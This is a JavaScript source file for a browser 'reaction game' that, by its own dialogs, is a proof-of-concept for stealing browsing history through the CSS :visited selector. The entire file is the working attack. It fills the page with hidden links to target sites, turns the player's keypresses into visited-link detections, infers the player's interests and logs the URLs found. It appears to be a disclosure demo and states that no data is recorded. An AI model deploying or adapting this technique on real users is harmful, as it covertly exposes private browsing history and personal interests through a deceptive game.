;(function(window) {
  var userAgent = navigator.userAgent || navigator.vendor || window.opera;
  var isMobile = /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(userAgent)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(userAgent.substr(0,4));
  var sharedState = {
    // lets us end the game after a minute
    gameStartTime: null,
    // lets us check for a long period of activity and pop
    // up a dummy element so that they don't get bored
    chunkStartTime: null,
    // lets us display their score in ms
    stepTime: null,
    // lets us cancel the next step if spacebar is clicked
    nextStep: null,
    // url and anchor being processed
    currentUrl: '',
    paused: true,
    inCountdown: false,
    DOM: {
      container: document.getElementById('container'),
      blocker: document.getElementById('blocker'),
      ms: document.getElementById('ms'),
      instructions: document.getElementById('instructions')
    },
    urls: [],
    anchors: [],
    probed: 0,
    visitedUrls: [],
    categories: {}
  };

  // Fisher-Yates shuffle, adapted from lodash
  function shuffle (array) {
    var index = -1, length = array.length, result = Array(length);

    array.forEach(function (value) {
      var rand = Math.floor(Math.random() * (++index + 1));
      result[index] = result[rand];
      result[rand] = value;
    });
    return result;
  }

  function alertInfo (fn) {
    swal({
      title: 'Reaction Game',
      text: 'This proof-of-concept uses the CSS :visited selector to ' +
        'steal history. It is 100% client-side; no data is recorded!',
      confirmButtonText: 'Continue',
      closeOnConfirm: false
    }, function () {
      swal({
        title: 'Reaction Game',
        text: 'The game lasts for a minute; feel free to keep playing if you ' +
        'wish to improve your results.\n\nAll code is on GitHub and feedback ' +
        'is very welcome.\n\nThis game will not work in your browser\'s ' +
        'private browsing or incognito modes.',
        confirmButtonText: 'Continue',
        closeOnConfirm: false
    }, function () {
        swal({
          title: 'Reaction Game',
          text: 'Since this is just a proof-of-concept, gameplay has been ' +
            'optimized only for Chrome desktop browsers.\n\nAll ' +
            'major browsers can support such an attack with minor tweaking.'
        }, fn);
      });
    });
  }

  function alertResults (final) {
    var visitedUrls = sharedState.visitedUrls, visLength = visitedUrls.length;
    var categories, top4;

    if (visLength) {
      categories = sharedState.categories;
      // sort the categories in descending order and pick 4 of the most common
      top4 = Object.keys(categories).sort(function (a, b) {
        return categories[b] - categories[a];
      }).slice(0, 4).join('\n');

      swal({
        title: final ? 'Finished!' : 'We found something!',
        text: 'We probed ' + sharedState.probed + ' sites and found ' +
          visLength + ' match' + (visLength > 1 ? 'es' : '') + ' in your ' +
          'history. It looks like you might be interested in:\n\n ' + top4 +
          '\n\nCheck the console for details' + (final ? '.' : ', and keep ' +
          'playing if you\'re curious :-)'),
        type: 'success',
        confirmButtonText: final ? 'Retry' : 'Okay'
      }, final);

      console.log('You\'ve visited:');
      console.log(visitedUrls);
      console.log('Which means that you might like:');
      console.log(categories);

    } else {
      swal({
        title: final ? 'Finished!' : 'Hmm...',
        text: 'We' + (final ? '' : '\'ve') + ' probed ' + sharedState.probed +
          ' sites' + (final ? '' : ' so far') + ' and still haven\'t come up ' +
          'with any matches.\n\nIf your browser is in private browsing ' +
          '(incognito) mode or if you recently cleared your history, this ' +
          'attack won\'t work.' + (final ? '' : ' We might have just gotten ' +
          'unlucky so feel free to keep playing!'),
        type: 'error',
        confirmButtonText: final ? 'Retry' : 'Okay'
      }, final);
    }

    // reset gameStartTime etc. in case they want to keep playing
    sharedState.gameStartTime = sharedState.currentUrl = null;
    sharedState.paused = true;
    sharedState.DOM.container.className = 'blocking';
    sharedState.DOM.instructions.textContent = 'to retry';
  }

  function initialize () {
    var request;

    // update copy for mobile devices
    if (isMobile) {
      document.getElementById('verb').textContent = 'Tap';
      document.getElementById('noun').textContent = 'screen';
    }

    // show info screens
    alertInfo(function () {
      // set event listeners only after the last info screen
      if (isMobile) {
        window.addEventListener('touchstart', function () {
          handleKeydown({key: 32}); // lol
        }, false);
      } else {
        window.addEventListener('keydown', handleKeydown, false);
      }
    });

    // grab targeted sites in the background
    request = new XMLHttpRequest();

    request.open('GET', '../sites.json', true);

    request.onload = function () {
      if (request.status >= 200 && request.status < 400){
        var sites = JSON.parse(request.responseText);
        var container = sharedState.DOM.container;
        var anchors = sharedState.anchors;
        var urls, a;

        // convert recieved object to a shuffled array & store it in sharedState
        urls = sharedState.urls =
          shuffle(Object.keys(sites).map(function (url) {
            return {
              url: url,
              categories: sites[url]
            };
        }));

        // fill the container with blank anchors
        for (var i = 0, _len = urls.length; i < _len; i++) {
          a = document.createElement('a');
          a.href = urls[i].url;
          container.appendChild(a);
          anchors.push(a);
        }
      }
    };

    request.send();
  }

  function gameOver () {
    alertResults(location.reload.bind(location));
    // blocks further keypresses
    sharedState.inCountdown = true;
    return null;
  }

  function step () {
    var now = sharedState.stepTime = new Date().getTime();

    if (sharedState.currentUrl) {
      sharedState.DOM.container.removeChild(sharedState.anchors.pop());
    }

    // if the game's been going for over 1m and we're not searching
    if (now - sharedState.gameStartTime > 60000) alertResults();

    // if we've gone 15s without a hit, simulate one so they don't get bored
    else if (now - sharedState.chunkStartTime > 15000) {
      sharedState.nextStep = sharedState.currentUrl = null;
      sharedState.DOM.container.className = 'dummy';
    }

    else {
      sharedState.currentUrl = sharedState.urls.pop();
      sharedState.nextStep = window.setTimeout(
        step, Math.floor((Math.random() * 200) + 800)
      );

      sharedState.probed++;
    }
  }

  function start () {
    function countdown (stage) {
      if (stage >= 0) {
        sharedState.DOM.ms.textContent = stage ? stage : 'GO';
        window.setTimeout(function () {
          countdown(stage - 1);
        }, 350);
      } else {
        if (!sharedState.gameStartTime) {
          sharedState.gameStartTime = new Date().getTime();
        }

        sharedState.DOM.container.className = '';
        sharedState.DOM.ms.textContent = '';
        sharedState.inCountdown = false;
        sharedState.chunkStartTime = new Date().getTime();
        step(0);
      }
    }
    sharedState.inCountdown = true;
    sharedState.DOM.container.className = 'blocking';
    countdown(3);
  }

  function handleKeydown(e) {
    var categories, visitedUrl, key = e.which || e.keyCode;

    if (!sharedState.inCountdown && key === 32) {
      if (sharedState.paused) {
        sharedState.paused = false;
        sharedState.DOM.instructions.textContent = "when red";
        start();
      } else {
        if (sharedState.nextStep) {
          window.clearTimeout(sharedState.nextStep);
          sharedState.nextStep = null;
          sharedState.DOM.container.className = 'non-blocking';

          visitedUrl = sharedState.currentUrl;
          categories = sharedState.categories;

          sharedState.visitedUrls.push(visitedUrl.url);
          visitedUrl.categories.forEach(function (category) {
            if (!categories[category]++) categories[category] = 1;
          });
        }
        sharedState.DOM.instructions.textContent = "to retry";
        sharedState.paused = true;
        sharedState.DOM.ms.innerText = new Date().getTime() - sharedState.stepTime + 'ms';
      }
    } else if (key === 65) {
      // prevent meta + a for select all
      e.preventDefault();
      return false;
    }
  }

  window.addEventListener('DOMContentLoaded', initialize, false);

})(this);
